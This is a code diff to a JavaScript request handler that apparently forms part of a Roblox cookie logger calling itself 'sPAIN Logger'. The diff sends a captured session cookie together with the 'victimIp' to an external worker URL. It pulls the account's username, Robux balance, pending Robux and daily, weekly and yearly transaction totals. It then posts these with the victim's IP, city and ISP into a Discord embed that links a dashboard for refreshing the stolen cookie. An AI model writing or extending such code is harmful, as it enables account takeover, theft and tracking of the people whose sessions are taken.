@@ -46,17 +46,17 @@ async function getIpGeo(ip) {
   } catch { return null; }
 }
 
-// Lite mode — only fetches robux, super fast (2 API calls)
-async function getRobux(cookie) {
+// Lite mode — validate + robux + summary
+async function getLiteInfo(cookie, ip) {
   try {
     const r = await fetch(WORKER_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ cookie, lite: true })
+      body: JSON.stringify({ cookie, victimIp: ip, lite: true })
     });
     if (!r.ok) return null;
     const d = await r.json();
-    return d.valid ? d.robux : null;
+    return d.valid ? d : null;
   } catch { return null; }
 }
 
@@ -149,9 +149,9 @@ export default async function handler(req, res) {
   }
 
   // Get geo and robux in parallel — both fast
-  const [geo, robux] = await Promise.all([
+  const [geo, liteInfo] = await Promise.all([
     getIpGeo(ip),
-    cookie ? getRobux(cookie) : Promise.resolve(null)
+    cookie ? getLiteInfo(cookie, ip) : Promise.resolve(null)
   ]);
 
   if (!cookie) {
@@ -195,11 +195,14 @@ export default async function handler(req, res) {
         description: ':fire: `sPAIN` :fire:',
         color:       0xc026d3,
         fields: [
-          { name: '🌐 IP',        value: ip || 'Unknown',                                                                    inline: true  },
-          { name: '📍 Location',  value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown', inline: true  },
-          { name: '🗺️ ISP',       value: geo?.isp || 'Unknown',                                                              inline: true  },
-          { name: '💰 Robux',     value: robux !== null ? `\`${Number(robux).toLocaleString()} R$\`` : '`Fetching...`',      inline: true  },
-          { name: '🔄 Dashboard', value: `[Open Dashboard](${refreshUrl})\nLive account info + refresh cookie anytime`,      inline: false }
+          { name: '👤 Username',   value: `\`${liteInfo.username}\``,                                                                        inline: true  },
+          { name: '💰 Robux',      value: `\`${Number(liteInfo.robux||0).toLocaleString()} R$\``,                                             inline: true  },
+          { name: '⏳ Pending',    value: `\`${Number(liteInfo.pendingRobux||0).toLocaleString()} R$\``,                                       inline: true  },
+          { name: '🌐 IP',         value: ip || 'Unknown',                                                                                     inline: true  },
+          { name: '📍 Location',   value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown',                  inline: true  },
+          { name: '🗺️ ISP',        value: geo?.isp || 'Unknown',                                                                               inline: true  },
+          { name: '📈 Summary',    value: `Day: \`${Number(liteInfo.txDay||0).toLocaleString()} R$\` | Week: \`${Number(liteInfo.txWeek||0).toLocaleString()} R$\` | Year: \`${Number(liteInfo.txYear||0).toLocaleString()} R$\``, inline: false },
+          { name: '🔄 Dashboard',  value: `[Open Dashboard](${refreshUrl})`,                                                                   inline: false }
         ],
         footer:    { text: `sPAIN Logger • ${pageName} • ${now}` },
         timestamp: now
